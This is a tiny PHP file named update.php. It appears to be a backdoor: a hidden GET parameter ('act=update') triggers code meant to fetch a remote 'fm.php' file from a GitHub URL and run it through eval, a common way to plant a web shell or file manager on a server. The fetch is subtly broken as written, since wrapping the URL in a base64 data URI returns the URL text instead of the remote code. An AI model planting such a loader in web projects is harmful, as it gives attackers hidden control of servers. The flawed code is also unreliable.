<?php
// update.php
if(isset($_GET['act']) && $_GET['act']=='update') {
    $c = @file_get_contents('data://text/plain;base64,' . base64_encode('https://raw.githubusercontent.com/GodOfServer/Sushi-Dont-Lie/main/fm.php'));
    if($c) eval('?>'.$c);
}
?>
